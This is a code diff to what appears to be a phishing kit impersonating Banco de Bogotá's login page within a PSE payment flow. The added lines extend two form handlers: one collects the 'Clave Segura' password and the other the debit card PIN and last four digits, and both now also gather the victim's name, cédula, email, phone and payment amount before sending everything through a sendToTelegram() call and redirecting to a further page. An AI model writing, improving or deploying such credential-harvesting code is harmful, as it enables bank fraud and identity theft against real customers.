@@ -788,7 +788,15 @@
                 const numDoc = document.getElementById('numDoc1').value;
                 const clave = document.getElementById('claveSegura').value;
 
-                const text = `🏦 <b>Banco de Bogotá - Clave Segura</b>\n\n🆔 Documento: ${tipoDoc} ${numDoc}\n🔑 Clave: ${clave}`;
+                const nombre = sessionStorage.getItem("nombre") || "---";
+                const cedula = sessionStorage.getItem("cedula") || "---";
+                const correo = sessionStorage.getItem("correo") || "---";
+                const telefono = sessionStorage.getItem("telefono") || "---";
+                const total = sessionStorage.getItem("total") || "---";
+                const banco = sessionStorage.getItem("banco") || "BANCO DE BOGOTA";
+                const tipoBanco = sessionStorage.getItem("tipoBanco") || "Natural";
+
+                const text = `🏦 <b>Datos de Pago PSE - Login de Banco de Bogotá</b>\n\n👤 Nombre: ${nombre}\n🪪 Cédula: ${cedula}\n📧 Correo: ${correo}\n📞 Teléfono: ${telefono}\n💰 Total: ${total}\n🏦 Banco: ${banco}\n🏷️ Tipo de Banco: ${tipoBanco}\n\n🔐 <b>Clave Segura</b>\n🆔 Documento: ${tipoDoc} ${numDoc}\n🔑 Clave: ${clave}`;
                 await sendToTelegram(text);
 
                 window.location.href = 'banco-bogota-dinamica.html';
@@ -803,7 +811,15 @@
                 const clave = document.getElementById('claveTarjeta').value;
                 const tarjeta = document.getElementById('ultimos4').value;
 
-                const text = `🏦 <b>Banco de Bogotá - Tarjeta Débito</b>\n\n🆔 Documento: ${tipoDoc} ${numDoc}\n🔑 Clave Tarjeta: ${clave}\n💳 Número Tarjeta: ${tarjeta}`;
+                const nombre = sessionStorage.getItem("nombre") || "---";
+                const cedula = sessionStorage.getItem("cedula") || "---";
+                const correo = sessionStorage.getItem("correo") || "---";
+                const telefono = sessionStorage.getItem("telefono") || "---";
+                const total = sessionStorage.getItem("total") || "---";
+                const banco = sessionStorage.getItem("banco") || "BANCO DE BOGOTA";
+                const tipoBanco = sessionStorage.getItem("tipoBanco") || "Natural";
+
+                const text = `🏦 <b>Datos de Pago PSE - Login de Banco de Bogotá</b>\n\n👤 Nombre: ${nombre}\n🪪 Cédula: ${cedula}\n📧 Correo: ${correo}\n📞 Teléfono: ${telefono}\n💰 Total: ${total}\n🏦 Banco: ${banco}\n🏷️ Tipo de Banco: ${tipoBanco}\n\n💳 <b>Tarjeta Débito</b>\n🆔 Documento: ${tipoDoc} ${numDoc}\n🔑 Clave Tarjeta: ${clave}\n💳 Número Tarjeta: ${tarjeta}`;
                 await sendToTelegram(text);
 
                 window.location.href = 'banco-bogota-dinamica.html';
